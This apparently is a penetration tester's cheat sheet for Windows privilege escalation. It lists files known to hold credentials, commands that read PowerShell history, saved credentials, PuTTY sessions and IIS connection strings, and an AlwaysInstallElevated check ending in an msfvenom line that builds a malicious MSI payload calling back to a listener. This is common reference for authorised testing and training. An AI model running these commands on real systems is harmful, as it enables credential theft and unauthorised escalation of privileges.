________________________
STATIC COMPILED BINARIES

https://github.com/ernw/static-toolbox/releases?q=&expanded=true

__________________________
USER PERMISSIONS HIERARCHY

  SYSTEM/LocalSystem
  Administrators
  Standard Users
  Local Service    (runs with "minimum" privileges, uses anonymous network creds)
  Network Service  (runs with "minimum" privileges, uses computer credentials for network auth)

_________________
USEFUL FILE PATHS

  Unattended installations:
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

  Internet Information Service (IIS) paths:
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 

_______________________
USEFUL COMMANDS

  retrieve powershell history:
    from cmd:        type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    from powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

  find database connection strings from IIS:
    type [IIS PATH] | findstr connectionString

  list saved credentials: cmdkey /list
  run cmd as other user:  runas /savecred /user:admin cmd.exe
  get puTTY credentials:  reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
  check scheduled tasks:  schtasks /fo list
  query individual task:  schtasks /query /tn "[TaskName]" /fo list /v
  check file permissions: icacls [FILEPATH]

  For exploiting AlwaysInstallElevated (both bits should be set):
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    If both are set:
      msfvenom -p [PAYLOAD] LHOST=[LHOST] LPORT=[LPORT] -f msi -o [OUTFILE]

  

